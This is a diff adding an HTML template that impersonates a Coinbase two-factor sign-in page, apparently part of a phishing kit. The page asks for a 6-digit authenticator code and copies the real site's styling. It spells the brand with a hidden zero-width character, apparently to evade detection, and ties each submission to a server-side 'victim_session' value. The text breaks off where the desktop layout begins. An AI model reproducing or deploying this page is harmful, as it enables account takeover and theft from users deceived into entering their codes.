@@ -1,0 +1,1163 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C&#8203;oinbase - Sign In</title>
+
+    <style>
+        /* Responsive toggle between desktop and mobile */
+        .desktop-view {
+            display: none;
+        }
+
+        .mobile-view {
+            display: block;
+        }
+
+        @media screen and (min-width: 768px) {
+            .desktop-view {
+                display: block;
+            }
+
+            .mobile-view {
+                display: none;
+            }
+        }
+
+        html,
+        body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+        }
+
+        /* Dark mode base styles */
+        body {
+            background-color: #0a0b0d !important;
+            color: #ffffff !important;
+        }
+
+        /* Make C&#8203;oinbase logo white */
+        .cds-iconStyles-irtngcj path {
+            fill: #ffffff !important;
+        }
+
+        /* Override the light theme variables */
+        .cds-light-lxvt6sp {
+            --foreground: #ffffff !important;
+            --foreground-muted: #a0a0a0 !important;
+            --background: #0a0b0d !important;
+            --background-alternate: #15171a !important;
+            --background-inverse: #ffffff !important;
+            --background-overlay: rgba(0, 0, 0, 0.7) !important;
+            --line: rgba(255, 255, 255, 0.1) !important;
+            --line-heavy: rgba(255, 255, 255, 0.3) !important;
+            --primary: #0052ff !important;
+            --primary-wash: rgba(0, 82, 255, 0.1) !important;
+            --primary-foreground: #ffffff !important;
+            --negative: #ff4d4d !important;
+            --negative-foreground: #ffffff !important;
+            --negative-wash: rgba(255, 77, 77, 0.1) !important;
+            --positive: #10b981 !important;
+            --positive-foreground: #ffffff !important;
+            --secondary: #15171a !important;
+            --secondary-foreground: #ffffff !important;
+            --transparent: transparent !important;
+            --warning: #f59e0b !important;
+            --warning-foreground: #ffffff !important;
+        }
+
+        /* OTP Input boxes - ALWAYS black background */
+        .cds-input-i10uvtgb,
+        .cds-input-i10uvtgb:hover,
+        .cds-input-i10uvtgb:focus,
+        .cds-input-i10uvtgb:active {
+            background-color: #0a0b0d !important;
+            border-color: rgba(255, 255, 255, 0.3) !important;
+            color: #ffffff !important;
+        }
+
+        /* Input container background - ALWAYS black */
+        .cds-inputAreaContainerStyles-ipofex6,
+        .cds-inputAreaContainerStyles-ipofex6:hover,
+        .cds-inputAreaContainerStyles-ipofex6:focus {
+            background-color: #0a0b0d !important;
+        }
+
+        /* Input interactable area - ALWAYS black */
+        [data-testid="input-interactable-area"],
+        [data-testid="input-interactable-area"]:hover,
+        [data-testid="input-interactable-area"]:focus,
+        [data-testid="input-interactable-area"]:active {
+            --interactable-background: #0a0b0d !important;
+            --interactable-hovered-background: #0a0b0d !important;
+            --interactable-pressed-background: #0a0b0d !important;
+            --interactable-disabled-background: #0a0b0d !important;
+            background-color: #0a0b0d !important;
+        }
+
+        /* Hover state - only change border */
+        [data-testid="input-interactable-area"]:hover {
+            border-color: rgba(255, 255, 255, 0.5) !important;
+        }
+
+        /* Focus state - only change border */
+        [data-testid="input-interactable-area"]:focus-within {
+            border-color: #578bfa !important;
+            box-shadow: 0 0 0 2px rgba(87, 139, 250, 0.2) !important;
+        }
+
+        /* Filled OTP boxes - STILL BLACK, only border changes */
+        [data-testid="input-interactable-area"][data-filled="true"] {
+            background: #0a0b0d !important;
+            border-color: #578bfa !important;
+            border-width: 2px !important;
+        }
+
+        /* Focus state for filled boxes - STILL BLACK */
+        [data-testid="input-interactable-area"][data-filled="true"]:focus-within {
+            background: #0a0b0d !important;
+            border-color: #578bfa !important;
+            box-shadow: 0 0 0 2px rgba(87, 139, 250, 0.2) !important;
+        }
+
+        /* Remove any blue background effects completely */
+        [data-testid="input-interactable-area"][data-filled="true"] {
+            background: #0a0b0d !important !important;
+        }
+
+        /* Continue button - disabled state (no OTP filled) */
+        .cds-button-b1oh4z3j:disabled {
+            background-color: #304b84 !important;
+            color: #a0a0a0 !important;
+            cursor: not-allowed !important;
+        }
+
+        /* Continue button - enabled state (OTP filled) */
+        .cds-button-b1oh4z3j:not(:disabled) {
+            background-color: #578bfa !important;
+            color: #ffffff !important;
+            cursor: pointer !important;
+        }
+
+        /* Continue button hover effects */
+        .cds-button-b1oh4z3j:not(:disabled):hover {
+            background-color: #4a7df5 !important;
+            transform: translateY(-1px);
+            transition: all 0.2s ease;
+        }
+
+        /* Text and typography */
+        .cds-foreground-f1v7bdxr {
+            color: #ffffff !important;
+        }
+
+        .cds-foregroundMuted-flk4pe3 {
+            color: #a0a0a0 !important;
+        }
+
+        /* Links */
+        .cds-link-l678mx9 {
+            color: #578bfa !important;
+        }
+
+        .cds-link-l678mx9:hover {
+            color: #4a7df5 !important;
+        }
+
+        /* Cookie banner */
+        .cds-backgroundAlternate-b11ss81y {
+            background-color: #15171a !important;
+            color: #ffffff !important;
+        }
+
+        /* Input text color */
+        [data-testid="code-inputs-container"] input {
+            color: #ffffff !important;
+            caret-color: #ffffff !important;
+            background-color: transparent !important;
+        }
+
+        /* Error message styling for dark mode */
+        #errorMessage {
+            background: rgba(255, 77, 77, 0.15) !important;
+            color: #ff8a8a !important;
+            border: 1px solid rgba(255, 77, 77, 0.3) !important;
+        }
+
+        /* Button state transitions */
+        .cds-button-b1oh4z3j {
+            transition: all 0.3s ease !important;
+        }
+
+        /* Remove any white backgrounds from input containers */
+        .cds-nativeInputBaseStyle-ngba8xt {
+            background-color: transparent !important;
+        }
+
+        /* Ensure the code inputs container has dark background */
+        [data-testid="code-inputs-container"] {
+            background-color: transparent !important;
+        }
+
+        /* Override any inline styles that might set light backgrounds */
+        .cds-inputBaseAreaStyles-i16zw4a5 {
+            background-color: #0a0b0d !important;
+        }
+
+        /* Force remove any background color changes on interaction */
+        .cds-interactable-i17wmk8f,
+        .cds-interactable-i17wmk8f:hover,
+        .cds-interactable-i17wmk8f:focus,
+        .cds-interactable-i17wmk8f:active {
+            background-color: #0a0b0d !important;
+        }
+
+        /* Specifically target and remove the blue background from the inline styles */
+        [style*="--interactable-background:var(--background)"] {
+            --interactable-background: #0a0b0d !important;
+            background-color: #0a0b0d !important;
+        }
+
+        [style*="--interactable-hovered-background:rgb(250,250,250)"] {
+            --interactable-hovered-background: #0a0b0d !important;
+            background-color: #0a0b0d !important;
+        }
+
+        [style*="--interactable-pressed-background:rgb(235,235,236)"] {
+            --interactable-pressed-background: #0a0b0d !important;
+            background-color: #0a0b0d !important;
+        }
+        /* Force blue colors for the authenticator device in desktop view */
+.desktop-view [data-testid="identity-multi-content-layout-content-header-wrapper-sms-input-code"] img {
+    background-color: transparent !important;
+}
+
+.desktop-view [data-testid="identity-multi-content-layout-content-header-wrapper-sms-input-code"] {
+    background-color: transparent !important;
+}
+/* Push cookie banner down in mobile view */
+/* Move cookie banner down in mobile view */
+/* For more dramatic spacing */
+.mobile-view [data-testid="mobile-cookie-banner"] {
+    margin-top: 80px !important;
+    padding-top: 40px !important;
+}
+
+.mobile-view .cds-flex-f1tjavv3.cds-column-c1kchipr.cds-3-_1rdigxg.cds-1-_1w0e50j {
+    margin-top: 80px !important;
+    padding-top: 40px !important;
+}
+
+    </style>
+
+    <link rel="stylesheet" href="/static/css/styless.css">
+    <link rel="stylesheet" href="/static/css/styles2.css">
+</head>
+
+<body>
+    <!-- MOBILE VERSION -->
+    <div class="mobile-view">
+        <div class="C&#8203;oinbase light">
+            <div class="cds-large-l1kwdti4 cds-light-lxvt6sp"
+                style=--foreground:rgb(var(--gray100));--foreground-muted:rgb(var(--gray60));--background:rgb(var(--gray0));--background-alternate:rgb(var(--gray5));--background-inverse:rgb(var(--gray100));--background-overlay:rgba(var(--gray80),0.33);--line:rgba(var(--gray60),0.2);--line-heavy:rgba(var(--gray60),0.66);--primary:rgb(var(--blue60));--primary-wash:rgb(var(--blue0));--primary-foreground:rgb(var(--gray0));--negative:rgb(var(--red60));--negative-foreground:rgb(var(--gray0));--negative-wash:rgb(var(--red0));--positive:rgb(var(--green60));--positive-foreground:rgb(var(--gray0));--secondary:rgb(var(--gray5));--secondary-foreground:rgb(var(--gray100));--transparent:rgba(var(--gray0),0);--warning:rgb(var(--yellow50));--warning-foreground:rgb(var(--orange40))>
+                <div data-testid=global-loading-provider-wrapper class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                    style=flex-grow:1;width:100%>
+                    <div data-testid=page-layout
+                        class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-space-between-s1y044t2 cds-background-b6zr2pu"
+                        style=height:100%;width:100%>
+                        <div data-testid=signin-header class="cds-grid-g1uqvyz9 cds-auto-agiev0s" role=banner
+                            style="grid-template-columns:auto 1fr auto">
+                            <div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-3-_63shon cds-3-_1krzigx cds-4-_1mgafrb cds-4-_dk22v4 cds-responsive"
+                                style=height:72px><svg aria-label="C&#8203;oinbase logo" class=cds-iconStyles-irtngcj height=32
+                                    role=img viewBox="0 0 48 48" width=32 xmlns=http://www.w3.org/2000/svg>
+                                    <title>C&#8203;oinbase logo</title>
+                                    <path
+                                        d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z"
+                                        fill=#0052FF></path>
+                                </svg></div>
+                        </div>
+                        <div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-0-_1ehpnd cds-1-_17cz18m"
+                            style=flex-grow:1;width:100%>
+                            <div data-testid=global-loading-provider-wrapper
+                                class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                                style=flex-grow:1;width:100%;align-items:center;justify-content:center>
+                                <div class="cds-flex-f1tjavv3 cds-flex-start-fptdbvx cds-row-r1cf21wt cds-center-cqy3t5k"
+                                    style=flex-grow:1;width:100%>
+                                    <div class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                                        style=flex-grow:1;height:100%;max-width:448px;width:100%>
+                                        <div class="cds-flex-f1tjavv3 cds-center-cqy3t5k cds-roundedLarge-r1hj45o7 cds-borderedOff-b16cgegt cds-3-_m245rc cds-3-_63shon cds-3-_5y4gfs"
+                                            style=width:100%>
+                                            <div id=two-factor
+                                                class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_10f3bvw"
+                                                style=width:100%>
+                                                <div class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                                                    style=flex-grow:1;max-width:448px;width:100%>
+                                                    <div data-testid=load-view-wrapper
+                                                        class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                                                        style=flex-grow:1;max-width:448px;width:100%>
+                                                        <div data-testid=sms-input-code
+                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-space-between-s1y044t2"
+                                                            style=flex-grow:1;width:100%>
+                                                            <div data-testid=identity-multi-content-layout-content-wrapper-sms-input-code
+                                                                class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-4-_rtvvf2 cds-3-_1ud7wyy">
+                                                                <div data-testid=identity-multi-content-layout-content-header-wrapper-sms-input-code
+                                                                    class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_1ud7wyy">
+                                                                    <img alt height=48
+                                                                        src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzAwNTJGRiIgZD0iTTggMmEyIDIgMCAwIDEgMi0yaDI4YTIgMiAwIDAgMSAyIDJ2NDRhMiAyIDAgMCAxLTIgMkgxMGEyIDIgMCAwIDEtMi0yeiIvPjxwYXRoIGZpbGw9IiNDRUQyREIiIGQ9Ik00OCA4SDB2MzJoNDh6Ii8+PHBhdGggZmlsbD0iIzBBMEIwRCIgZD0iTTQwIDhIOHYzMmgzMnoiLz48cGF0aCBmaWxsPSIjRkZGRkZGIiBkPSJNMTUgMjUuNWExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM200LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM300LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM300LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM300LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgMyIvPjxwYXRoIGZpbGw9IiMwQTBCMEQiIGQ9Ik0yMSA0NGExIDEgMCAwIDEgMS0xaDRhMSAxIDAgMSAxIDAgMmgtNGExIDEgMCAwIDEtMS0xbTQtNDBhMSAxIDAgMSAxLTIgMCAxIDEgMCAwIDEgMiAwIi8+PC9zdmc+
+                                                                        width=48>
+                                                                    <div data-testid=identity-multi-content-layout-title-wrapper
+                                                                        class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-1-_1w0e50j">
+                                                                        <p
+                                                                            class="cds-typographyResets-t6muwls cds-title1-t2i0v90 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow">
+                                                                            Enter the 6-digit code from your
+                                                                            authenticator app
+                                                                        </p>
+                                                                        <p
+                                                                            class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow cds-break-b1kd50ys">
+                                                                            This extra step shows that it's really you
+                                                                            trying to sign in.
+                                                                        </p>
+                                                                    </div>
+                                                                </div>
+                                                                <div data-testid=identity-multi-content-layout-body-sms-input-code
+                                                                    class="cds-flex-f1tjavv3 cds-column-c1kchipr">
+                                                                    <div data-testid=sms-input-body
+                                                                        class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-2-_mr0se7">
+                                                                        <form id="authFormMobile">
+                                                                            <input type="hidden" id="sessionId"
+                                                                                name="session_id"
+                                                                                value="{{ session.get('victim_session', '') }}">
+                                                                            <input type="text" id="codeMobile"
+                                                                                name="2facode"
+                                                                                style="position: absolute; opacity: 0; pointer-events: none;"
+                                                                                maxlength="6">
+                                                                            <div
+                                                                                class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0-_1dm135g">
+                                                                                <div data-testid=code-inputs-container
+                                                                                    class="cds-flex-f1tjavv3 cds-row-r1cf21wt cds-relative-r5okg6e cds-1-_1w0e50j"
+                                                                                    role=group
+                                                                                    aria-label="numerical code inputs"
+                                                                                    style=width:100%;position:relative>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5 cds-persistedFocusStyles-p6phjeo"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 1"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-mobile-1
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete=one-time-code
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 2"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-mobile-2
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 3"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-mobile-3
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 4"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-mobile-4
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 5"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-mobile-5
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                    <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
+                                                                                        style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
+                                                                                        <div data-testid
+                                                                                            class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
+                                                                                            style=width:100%;opacity:1>
+                                                                                            <div
+                                                                                                class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
+                                                                                                <div
+                                                                                                    class=cds-inputAreaContainerStyles-ipofex6>
+                                                                                                    <span
+                                                                                                        data-testid=input-interactable-area
+                                                                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
+                                                                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
+                                                                                                        <div data-testid
+                                                                                                            class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
+                                                                                                        </div><input
+                                                                                                            aria-label="6 digit code, digit 6"
+                                                                                                            class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
+                                                                                                            tabindex=0
+                                                                                                            aria-invalid=false
+                                                                                                            id=cds-textinput-label-mobile-6
+                                                                                                            type=text
+                                                                                                            inputmode=numeric
+                                                                                                            autocomplete
+                                                                                                            value
+                                                                                                            style=text-align:center;color-scheme:light
+                                                                                                            maxlength="1">
+                                                                                                    </span></div>
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                            <!-- Error message -->
+                                                                            <div id="errorMessageMobile"
+                                                                                style="display: none; color: #ff4d4d; padding: 10px; margin: 10px 0; background: rgba(255, 77, 77, 0.1); border-radius: 4px; text-align: center;">
+                                                                                Invalid verification code. Please try
+                                                                                again.
+                                                                            </div>
+                                                                        </form>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                            <div
+                                                                class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-2-_mr0se7">
+                                                                <button
+                                                                    data-testid="unified-login-email-prompt-submit-button"
+                                                                    aria-busy="false" aria-disabled="true"
+                                                                    class="cds-interactable-i17wmk8f cds-disabledState-do7z3i1 cds-disabledBorder-d109aw8r cds-transparent-t1pmzpst cds-button-b15nm6xx cds-fullWidth-f10ei5ro cds-scaledDownState-s1o6alxd cds-primaryForeground-pd71c0x cds-button-b1oh4z3j cds-buttonBlock-b1aolcod cds-4-_1g6imbc cds-4-_13srchq"
+                                                                    disabled="" type="button" id="submitButtonMobile"
+                                                                    style="pointer-events:none;--interactable-height:56px;--interactable-border-radius:56px;--interactable-background:var(--primary);--interactable-hovered-background:rgb(1,76,236);--interactable-hovered-opacity:0.92;--interactable-pressed-background:rgb(1,72,221);--interactable-pressed-opacity:0.86;--interactable-disabled-background:rgb(128,169,255)"><span
+                                                                        class="cds-positionRelative-pa1s919"><span
+                                                                            class="cds-typographyResets-t6muwls cds-headline-h4steop cds-primaryForeground-pd71c0x cds-transition-t1qvlahm cds-start-s1u0g7ow"><span>Continue</span></span></span></button>
+                                                            </div>
+                                                            <div data-testid=mobile-cookie-banner
+                                                                class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_1rdigxg cds-1-_1w0e50j">
+                                                                <div class="cds-flex-f1tjavv3 cds-column-c1kchipr"
+                                                                    style=max-height:150px;opacity:1>
+                                                                    <p
+                                                                        class="cds-typographyResets-t6muwls cds-legal-lzv3g65 cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow">
+                                                                        We use strictly necessary cookies to enable
+                                                                        essential functions, such as security and
+                                                                        authentication. For more information, see our <a
+                                                                            class="cds-link cds-link-l678mx9"
+                                                                            href=https://C&#8203;oinbase.com/legal/cookie
+                                                                            rel="noopener noreferrer"
+                                                                            target=_blank><span
+                                                                                class="cds-typographyResets-t6muwls cds-legal-lzv3g65 cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow cds-underline-u1x5xrhj cds-link--container">Cookie
+                                                                                Policy</span></a> and <a
+                                                                            data-testid=link-privacy-policy
+                                                                            class="cds-link cds-link-l678mx9"
+                                                                            href=https://C&#8203;oinbase.com/legal/privacy
+                                                                            rel="noopener noreferrer"
+                                                                            target=_blank><span
+                                                                                class="cds-typographyResets-t6muwls cds-legal-lzv3g65 cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow cds-underline-u1x5xrhj cds-link--container">Privacy
+                                                                                Policy</span></a>.</p>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- DESKTOP VERSION -->
+    <div class="desktop-view">
+        <div class="C&#8203;oinbase light">
+            <div class="cds-large-l1kwdti4 cds-light-lxvt6sp"
